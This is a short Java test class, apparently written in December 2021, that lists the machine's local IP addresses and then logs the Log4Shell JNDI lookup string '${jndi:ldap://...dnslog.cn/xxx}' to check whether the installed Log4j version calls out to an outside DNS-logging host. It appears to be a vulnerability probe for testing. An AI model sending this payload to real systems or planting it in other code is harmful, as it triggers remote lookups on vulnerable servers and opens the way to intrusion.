package org.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.util.Strings;

import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.List;

/**
 * @Author JDragon
 * @Date 2021.12.10 下午 2:13
 * @Email 1061917196@qq.com
 * @Des:
 */
public class TestLog4j {

    private static final Logger LOGGER = LogManager.getLogger();


    public static void main(String[] args) {
        getLocalIps().forEach(System.out::println);
        LOGGER.error(" ${jndi:ldap://do9c0k.dnslog.cn/xxx},{}","${jndi:ldap://do9c0k.dnslog.cn/xxx}");
    }

    /**
     * Returns all the local host names and ip addresses.
     *
     * @return The local host names and ip addresses.
     */
    public static List<String> getLocalIps() {
        List<String> localIps = new ArrayList<>();
        localIps.add("localhost");
        localIps.add("127.0.0.1");
        try {
            final InetAddress addr = Inet4Address.getLocalHost();
            setHostName(addr, localIps);
        } catch (final UnknownHostException ex) {
            // Ignore this.
        }
        try {
            final Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
            if (interfaces != null) {
                while (interfaces.hasMoreElements()) {
                    final NetworkInterface nic = interfaces.nextElement();
                    final Enumeration<InetAddress> addresses = nic.getInetAddresses();
                    while (addresses.hasMoreElements()) {
                        final InetAddress address = addresses.nextElement();
                        setHostName(address, localIps);
                    }
                }
            }
        } catch (final SocketException se) {
            // ignore.
        }
        return localIps;
    }

    private static void setHostName(InetAddress address, List<String> localIps) {
        String[] parts = address.toString().split("\\s*/\\s*");
        if (parts.length > 0) {
            for (String part : parts) {
                if (Strings.isNotBlank(part) && !localIps.contains(part)) {
                    localIps.add(part);
                }
            }
        }
    }
}
